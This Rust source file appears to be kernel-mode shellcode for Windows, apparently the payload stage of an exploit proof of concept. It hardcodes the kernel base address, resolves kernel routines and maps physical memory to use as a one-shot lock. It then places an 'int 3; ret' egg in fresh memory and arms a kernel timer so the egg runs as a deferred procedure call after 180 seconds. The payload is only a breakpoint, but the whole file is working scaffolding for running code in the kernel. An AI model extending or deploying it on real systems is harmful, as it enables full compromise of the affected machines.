#![no_std]
#![feature(asm)]
#![feature(core_intrinsics)]
use core::arch::asm;


#[no_mangle]
unsafe extern "stdcall"
fn _DllMainCRTStartup(
    _hinst_dll: *const u8,
    _fdw_reason: u32,
    _lpv_reserved: *const u8
) -> u64
{
    match shellcode_start() {
        Ok(_) => 0,
        Err(x) => x as _,
    }
}

unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
    // let nt_base = resolver::find_nt_base_address();
    let nt_base: ntdef::types::PVOID;
	asm!(
		"mov {0}, 0xfffff8024f205000",
		out(reg) nt_base
	);

    let ex_allocate_pool: ntdef::functions::ExAllocatePool = ntproc::find!("ExAllocatePool");
    let ke_initialize_timer: ntdef::functions::KeInitializeTimer = ntproc::find!("KeInitializeTimer");
    let ke_initialize_dpc: ntdef::functions::KeInitializeDpc = ntproc::find!("KeInitializeDpc");
    let ke_set_timer_ex: ntdef::functions::KeSetTimerEx = ntproc::find!("KeSetTimerEx");
    /*
    let ex_initialize_fast_mutex: ntdef::functions::ExInitializeFastMutex = ntproc::find!("ExInitializeFastMutex");
    let ex_try_to_acquire_fast_mutex: ntdef::functions::ExTryToAcquireFastMutex = ntproc::find!("ExTryToAcquireFastMutex");
    */
    let mm_allocate_contiguous_memory: ntdef::functions::MmAllocateContiguousMemory = ntproc::find!("MmAllocateContiguousMemory");
    let mm_map_io_space: ntdef::functions::MmMapIoSpace = ntproc::find!("MmMapIoSpace");

    let mutex_phys = mm_map_io_space(0 as _, 128, ntdef::enums::MmNonCached);
    /*
    let _ = ex_initialize_fast_mutex(mutex_phys);
    let acquired = ex_try_to_acquire_fast_mutex(mutex_phys);
    */
    let acquired = try_to_acquire_fast(mutex_phys as _);
    if acquired == 1 as _ {
        let timer = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 128);
        let _ = ke_initialize_timer(timer);
        let dpc = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 128);
        let deferred_routine = mm_allocate_contiguous_memory(16384, 0xFFFFFFFFFFFFFFFF);
        let egg = [0xccu8, 0xc3u8]; // int 3; ret
        let _ = ntdef::macros::RtlCopyMemory(deferred_routine as _, &egg as _, 2);
        let params = ntdef::enums::NULL;
        let _ = ke_initialize_dpc(dpc, deferred_routine, params);
        let due_time: ntdef::types::LARGE_INTEGER = -10000000 * 180; // 180 seconds
        let period: ntdef::types::LONG = 0; // non-periodic
        let _ = ke_set_timer_ex(timer, due_time, period, dpc);
    }

    Ok(())
}

unsafe fn try_to_acquire_fast(sync: *mut u32) -> u32 {
    // I assume that the pointer is (can be) to uninitialized memory, so I need to xchg with some "cookie"
    // The cookie chosen is "0xdead"
    let _key: u32;
    let acquired: u32;
    asm!(
        "xor {2}, {2}",
        "mov {0:e}, 0xdead",
        "xchg {0:e}, DWORD PTR[{1}]",
        "cmp {0:e}, 0xdead",    
        "je 3f",
        "inc {2}",
        "3:",
        out(reg) _key,
        in(reg) sync,
        out(reg) acquired
    );
    acquired
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {
    }
}
